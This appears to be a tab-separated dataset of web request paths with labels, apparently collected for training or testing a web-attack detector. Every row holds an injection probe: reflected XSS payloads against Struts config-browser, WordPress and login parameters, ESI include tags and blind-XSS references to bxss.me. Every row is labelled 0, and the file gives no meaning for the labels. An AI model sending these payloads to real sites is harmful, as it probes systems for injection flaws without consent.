sentences	labels
/jsearchfront&template&http:&&bxss.me&t&fit.txt?.jpg/***************/16/images/plugin/voice/voice.css 	 0
/jsearchfront&search.do?params<esi:include src=""http://*******/rpb.png""/> 	 0
/prn&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/en&ourbusiness&projectcontracting&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/lz&system&count&0006000&000000000000&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/vc&http:&&bxss.me&t&fit.txt?.jpg/***/page.css 	 0
/xxgk&zfwjn&1088&1090&list.html?new=bxss.me/*/xss.html? 	 0
/ywly&gccb&nygc&images&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/xxgk&zzxxgk&tjj&zfxxgkml_2127&jytabljg_2061&list.html?new=0.7714426940466816<esi:include src=""http://*******/rpb.png""/> 	 0
/xxgk&zfwjn&1088&1091&list.html?new=bxss.me/*/xss.html? 	 0
/en&images&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/kjcx&qyzz&swb&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/gygj&ssgs&kmbg&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/zlxz&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/ztzl&tpgj&zyzs&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/ywly&kjyf&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/ztpd&system&count&0036012&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/??/**/***/**/8=8 	 0
/icons&mswpmm&common&signin.aspx?tbpassword=alert(777)returnurl=/******/common/default.aspx 	 0
/gygj&jtdj&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/vc&http:&&bxss.me&t&fit.txt?.jpg/***/easyui/plugins/jquery.panel.js 	 0
/__local&7&01&9d&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/was5&web&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/lz&reviews&index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/***/)&false_positives=without&sort=&asc=false&commit=search 	 0
/inc&reviews&index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="">alert(/***/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search 	 0
/zwgk&http:&&bxss.me&t&fit.txt?.jpg/****/gdyx/ 	 0
/news&consultdetails&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/en&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/prn&wp-admin&admin.php?page=thecartpress/*****/addressedit.php&address_id='"><script>alert(77729;</script> 	 0
/gygj&gjgk&zzjg&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/public&js&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/xwzx&zgsdt&zgs17_6389&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/vc&ui&http:&&bxss.me&t&fit.txt?.jpg/******/plugins/jquery.panel.js 	 0
/ldzc&bysw&202007&t20200701_168744.html?leader=Ðì¡¡·å<esi:include src=""http://*******/rpb.png""/> 	 0
/qywh&whhd&202105&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/z&210719&index&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/ldzc&bysrd&201612&t20161202_79141.html?leader=ËÞ¿¡Ç¬<esi:include src=""http://*******/rpb.png""/> 	 0
/kjcx&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/jsearchfront&template&http:&&bxss.me&t&fit.txt?.jpg/***************/16/images/plugin/voice/hzrecorder.js 	 0
/synr&dbgd&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/nbfw&api&sources?resource=alert(/***/)&format=txt 	 0
/es&reviews&index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="">alert(/***/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search 	 0
/xwzx&wp-admin&admin.php?page=thecartpress/*****/addressedit.php&address_id='"><script>alert(77729;</script> 	 0
/zxzx&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/lxwm&api&sources?resource=alert(/***/)&format=txt 	 0
/xxgk&zfwjn&1088&1093&list.html?new=0.7199116495223474<esi:include src=""http://*******/rpb.png""/> 	 0
/ru&reviews&index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/***/)&false_positives=without&sort=&asc=false&commit=search 	 0
/js&mswpmm&common&signin.aspx?btnsignin=alert(777)returnurl=/******/common/default.aspx 	 0
/shzr&jzgj&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/rlzy&reviews&index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/***/)&false_positives=without&sort=&asc=false&commit=search 	 0
/searchfinancial.jspx?channelid=1480&producttype=2&querystr=1&renew=0<esi:include src=""http:?channelid=1480&producttype=2&querystr=1&renew=0<esi:include src=""http://*******/rpb.png""/>&termtype=0 	 0
/public&mswpmm&common&signin.aspx?tbpassword=alert(777)returnurl=/******/common/default.aspx 	 0
/ldzc&byszf&201610&t20161016_542.html?leader=bxss.me/*/xss.html? 	 0
